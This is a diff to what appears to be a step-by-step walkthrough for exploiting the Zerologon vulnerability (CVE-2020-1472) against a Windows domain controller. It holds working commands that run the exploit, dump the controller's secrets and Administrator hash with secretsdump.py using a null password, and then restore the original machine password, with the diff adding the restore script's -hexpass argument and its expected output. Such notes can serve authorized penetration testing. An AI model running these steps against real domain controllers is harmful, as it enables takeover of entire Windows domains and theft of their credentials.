@@ -32,10 +32,12 @@ $ python3 cve-2020-1472-exploit.py <DC_NAME> <DC_IP_ADDRESS>
 $ secretsdump.py -just-dc <DOMAIN_NAME>/<DC_NAME>\$@<DC_IP_ADDRESS>
 - this will allow you to now logon to DC without password and dump its secrets
 - the \$ escapes the dollar sign and tells the device that the password is null; when the password is requested, simply hit ENTER
-- make sure to copy the Administrator hash in order to be able to restore the DC
+- NOTE: make sure to copy the Administrator hash in order to be able to restore the DC!
 
 Restoration:
 $ secretsdump.py administrator@<DC_IP_ADDRESS> -hashes <Administrator's_hash>
 - now copy the hash that appears after the words: "plain_password_hex"
-$ python3 restorepassword.py <DOMAIN_NAME>/<DC_NAME>@<DC_NAME> -target-ip <DC_IP_ADDRESS>
+$ python3 restorepassword.py <DOMAIN_NAME>/<DC_NAME>@<DC_NAME> -target-ip <DC_IP_ADDRESS> -hexpass <PLAIN_PASSWORD_HEX>
+- this is the script to restore the DC
 - the restore script is already built in to the https://github.com/dirkjanm/CVE-2020-1472 download
+- after running this script you should see: "Change password OK"; this means that the DC has been restored to its original password and everything is ok
